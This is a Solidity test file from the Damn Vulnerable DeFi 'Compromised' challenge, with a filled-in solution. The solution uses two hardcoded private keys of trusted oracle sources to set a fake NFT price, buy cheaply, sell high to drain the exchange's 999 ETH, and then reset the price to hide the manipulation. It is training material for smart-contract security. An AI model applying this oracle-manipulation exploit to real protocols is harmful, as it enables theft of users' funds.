// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        // Derive the addresses from obtained private keys
        address[] memory trustedSources = new address[](2);
        trustedSources[0] = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
        trustedSources[1] = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);

        // Manipluate the price of the NFT to 0.1 ether to buy NFT
        _manipulatePrice(trustedSources, 0.1 ether);

        // Buy NFT for 0.1 ether
        vm.prank(player);
        exchange.buyOne{value: 0.1 ether}();

        // Set to 999.1 ether to sell NFT and steal all the funds from Exchange
        _manipulatePrice(trustedSources, INITIAL_NFT_PRICE + PLAYER_INITIAL_ETH_BALANCE);

        // Sell NFT and send the funds to the recovery account
        vm.startPrank(player);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);

        (bool success,) = address(recovery).call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
        require(success, "Transfer failed");
        vm.stopPrank();

        // Set the price to its initial value
        _manipulatePrice(trustedSources, INITIAL_NFT_PRICE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }

    /**
     * UTILITY FUNCTIONS FOR SOLUTION
     */
    function _manipulatePrice(address[] memory trustedSources, uint256 price) private {
        for (uint256 i = 0; i < trustedSources.length; i++) {
            vm.prank(sources[i]);
            oracle.postPrice("DVNFT", price);
        }
    }
}
